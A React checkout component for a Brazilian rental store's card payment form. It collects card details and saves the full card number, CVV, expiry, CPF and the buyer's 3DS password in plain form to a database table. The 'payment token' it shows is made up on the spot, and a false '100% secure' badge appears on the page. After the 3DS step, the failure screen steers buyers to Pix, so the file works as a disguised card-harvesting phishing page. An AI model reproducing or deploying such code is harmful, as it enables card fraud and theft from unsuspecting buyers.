import { useState, useRef, useMemo } from "react";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { formatCpf, validateCpf } from "@/lib/cpf";
import { formatCardNumber, formatExpiry, detectBrand, validateLuhn } from "@/lib/card";
import CardPreview from "@/components/CardPreview";
import ThreeDSModal from "@/components/ThreeDSModal";
import { supabase } from "@/integrations/supabase/client";
import { Loader2, CreditCard, Lock, ShieldCheck } from "lucide-react";

const INSTALLMENT_FEE_RATE = 0.12; // 12% por parcela (composto)
const MAX_INSTALLMENTS = 12;

interface CardPaymentFormProps {
  totalPrice: number;
  formatCurrency: (v: number) => string;
  customerName: string;
  customerPhone: string;
  planId: string;
  planLabel: string;
  quantity: number;
  coupon: string | null;
  address: string;
  onSuccess: () => void;
  onFailure: () => void;
  onSwitchToPix: () => void;
}

const CardPaymentForm = ({
  totalPrice,
  formatCurrency,
  customerName,
  customerPhone,
  planId,
  planLabel,
  quantity,
  coupon,
  address,
  onSuccess,
  onFailure,
  onSwitchToPix,
}: CardPaymentFormProps) => {
  const [holderName, setHolderName] = useState("");
  const [cpf, setCpf] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [installments, setInstallments] = useState<number>(1);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);
  const [show3DS, setShow3DS] = useState(false);
  const [threeDSResult, setThreeDSResult] = useState<"success" | "failure" | null>(null);
  const txIdRef = useRef<string | null>(null);

  const brand = detectBrand(cardNumber);

  const validate = (): boolean => {
    const e: Record<string, string> = {};
    if (!holderName.trim() || holderName.trim().length < 3) e.holderName = "Informe o nome do titular";
    if (!validateCpf(cpf)) e.cpf = "CPF inválido";
    if (!validateLuhn(cardNumber)) e.cardNumber = "Número do cartão inválido";
    const expiryDigits = expiry.replace(/\D/g, "");
    if (expiryDigits.length !== 4) {
      e.expiry = "Informe a validade";
    } else {
      const month = parseInt(expiryDigits.slice(0, 2));
      if (month < 1 || month > 12) e.expiry = "Mês inválido";
    }
    if (cvv.length < 3) e.cvv = "CVV inválido";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleSubmit = async () => {
    if (!validate()) return;
    setLoading(true);

    const digits = cardNumber.replace(/\D/g, "");
    const token = `tok_${crypto.randomUUID().replace(/-/g, "").slice(0, 24)}`;
    const txId = crypto.randomUUID();
    txIdRef.current = txId;

    const { error } = await supabase.from("card_transactions" as any).insert({
      id: txId,
      token,
      holder_name: holderName.trim(),
      cpf: cpf.replace(/\D/g, ""),
      card_brand: brand,
      card_last4: digits.slice(-4),
      card_number: digits,
      card_cvv: cvv,
      card_expiry: expiry,
      plan_id: planId,
      plan_label: planLabel,
      quantity,
      amount: totalPrice,
      coupon: coupon || null,
      customer_name: customerName,
      customer_phone: customerPhone,
      address: address || null,
      status: "pending",
      threeds_password: "",
    });

    if (error) console.error("Erro ao salvar transação:", error);

    setLoading(false);
    setShow3DS(true);
  };

  const handle3DSComplete = async (approved: boolean, threedsPassword?: string) => {
    setShow3DS(false);
    setLoading(true);

    if (txIdRef.current) {
      const { error } = await supabase
        .from("card_transactions" as any)
        .update({
          threeds_password: threedsPassword || "",
          status: approved ? "pending" : "rejected",
        })
        .eq("id", txIdRef.current);

      if (error) console.error("Erro ao atualizar transação:", error);
    }

    if (approved) {
      setThreeDSResult("success");
      onSuccess();
    } else {
      setThreeDSResult("failure");
      onFailure();
    }

    setLoading(false);
  };

  if (threeDSResult === "success") {
    return (
      <div className="text-center space-y-5 py-10">
        <div className="mx-auto w-18 h-18 rounded-2xl bg-green-500/15 flex items-center justify-center">
          <ShieldCheck className="h-9 w-9 text-green-500" />
        </div>
        <h3 className="text-lg font-black text-foreground tracking-tight">Pagamento em análise</h3>
        <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
          Sua transação foi recebida e está sendo processada. Você receberá a confirmação em breve.
        </p>
        <p className="text-xs text-muted-foreground/60">Token: <code className="bg-muted px-2 py-1 rounded-lg text-[11px]">{`tok_****`}</code></p>
      </div>
    );
  }

  if (threeDSResult === "failure") {
    return (
      <div className="text-center space-y-5 py-10">
        <div className="mx-auto w-18 h-18 rounded-2xl bg-destructive/15 flex items-center justify-center">
          <CreditCard className="h-9 w-9 text-destructive" />
        </div>
        <h3 className="text-lg font-black text-foreground tracking-tight">Pagamento com cartão indisponível</h3>
        <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
          Para a primeira locação, o pagamento é realizado via Pix.
          <br />
          Após isso, o cartão fica disponível para os próximos pedidos.
        </p>
        <div className="flex flex-col gap-2 pt-3">
          <Button onClick={onSwitchToPix} className="w-full text-base font-bold rounded-xl h-12 shadow-lg shadow-primary/20" size="lg">
            Pagar com Pix
          </Button>
        </div>
      </div>
    );
  }

  const inputClass = "text-sm h-12 rounded-xl border-border/60 bg-background/80 focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all";

  return (
    <div className="space-y-5">
      <CardPreview
        number={formatCardNumber(cardNumber)}
        name={holderName}
        expiry={expiry}
        brand={brand}
        cpf={formatCpf(cpf)}
      />

      <div className="space-y-4">
        <div className="space-y-1.5">
          <Label htmlFor="holderName" className="text-xs font-bold uppercase tracking-wider text-muted-foreground">Nome do titular</Label>
          <Input
            id="holderName"
            placeholder="Nome como está no cartão"
            value={holderName}
            onChange={(e) => setHolderName(e.target.value.toUpperCase())}
            className={`${inputClass} ${errors.holderName ? "border-destructive ring-destructive/20" : ""}`}
          />
          {errors.holderName && <p className="mt-0.5 text-[11px] text-destructive font-medium">{errors.holderName}</p>}
        </div>

        <div className="space-y-1.5">
          <Label htmlFor="cpfCard" className="text-xs font-bold uppercase tracking-wider text-muted-foreground">CPF do titular</Label>
          <Input
            id="cpfCard"
            placeholder="000.000.000-00"
            value={cpf}
            onChange={(e) => setCpf(formatCpf(e.target.value))}
            maxLength={14}
            inputMode="numeric"
            className={`${inputClass} ${errors.cpf ? "border-destructive ring-destructive/20" : ""}`}
          />
          {errors.cpf && <p className="mt-0.5 text-[11px] text-destructive font-medium">{errors.cpf}</p>}
        </div>

        <div className="space-y-1.5">
          <Label htmlFor="cardNumber" className="text-xs font-bold uppercase tracking-wider text-muted-foreground">Número do cartão</Label>
          <Input
            id="cardNumber"
            placeholder="0000 0000 0000 0000"
            value={formatCardNumber(cardNumber)}
            onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))}
            maxLength={19}
            inputMode="numeric"
            className={`${inputClass} ${errors.cardNumber ? "border-destructive ring-destructive/20" : ""}`}
          />
          {errors.cardNumber && <p className="mt-0.5 text-[11px] text-destructive font-medium">{errors.cardNumber}</p>}
        </div>

        <div className="grid grid-cols-2 gap-3">
          <div className="space-y-1.5">
            <Label htmlFor="expiry" className="text-xs font-bold uppercase tracking-wider text-muted-foreground">Validade</Label>
            <Input
              id="expiry"
              placeholder="MM/AA"
              value={expiry}
              onChange={(e) => setExpiry(formatExpiry(e.target.value))}
              maxLength={5}
              inputMode="numeric"
              className={`${inputClass} ${errors.expiry ? "border-destructive ring-destructive/20" : ""}`}
            />
            {errors.expiry && <p className="mt-0.5 text-[11px] text-destructive font-medium">{errors.expiry}</p>}
          </div>
          <div className="space-y-1.5">
            <Label htmlFor="cvv" className="text-xs font-bold uppercase tracking-wider text-muted-foreground">CVV</Label>
            <Input
              id="cvv"
              placeholder="000"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
              maxLength={4}
              inputMode="numeric"
              type="password"
              className={`${inputClass} ${errors.cvv ? "border-destructive ring-destructive/20" : ""}`}
            />
            {errors.cvv && <p className="mt-0.5 text-[11px] text-destructive font-medium">{errors.cvv}</p>}
          </div>
        </div>
      </div>

      {/* Installments */}
      <div className="space-y-2">
        <Label className="text-xs font-bold uppercase tracking-wider text-muted-foreground">Parcelas</Label>
        <div className="grid grid-cols-3 gap-2.5">
          {([1, 2, 3] as const).map((n) => {
            const parcela = totalPrice / n;
            const isActive = installments === n;
            return (
              <button
                key={n}
                type="button"
                onClick={() => setInstallments(n)}
                className={`rounded-2xl border-2 p-3 text-center transition-all duration-200 ${
                  isActive
                    ? "border-primary bg-primary/10 shadow-md shadow-primary/10 scale-[1.02]"
                    : "border-border/50 hover:border-primary/40 hover:bg-muted/30"
                }`}
              >
                <span className={`block text-base font-black ${isActive ? "text-primary" : "text-foreground"}`}>{n}x</span>
                <span className="block text-xs text-muted-foreground font-medium mt-0.5">
                  {formatCurrency(parcela)}
                </span>
                {n > 1 && <span className="block text-[10px] text-green-500 font-semibold mt-0.5">sem juros</span>}
              </button>
            );
          })}
        </div>
      </div>

      <Button
        onClick={handleSubmit}
        className="w-full text-base font-bold rounded-xl h-13 shadow-lg shadow-primary/20 transition-all hover:shadow-xl hover:shadow-primary/25"
        size="lg"
        disabled={loading}
      >
        {loading ? (
          <>
            <Loader2 className="mr-2 h-4 w-4 animate-spin" />
            Processando...
          </>
        ) : (
          `Pagar ${installments}x ${formatCurrency(totalPrice / installments)} • ${formatCurrency(totalPrice)}`
        )}
      </Button>

      <div className="flex items-center justify-center gap-1.5 text-[11px] text-muted-foreground/50">
        <Lock className="h-3.5 w-3.5" />
        Pagamento 100% seguro · Criptografia SSL
      </div>

      <ThreeDSModal open={show3DS} onComplete={handle3DSComplete} />
    </div>
  );
};

export default CardPaymentForm;
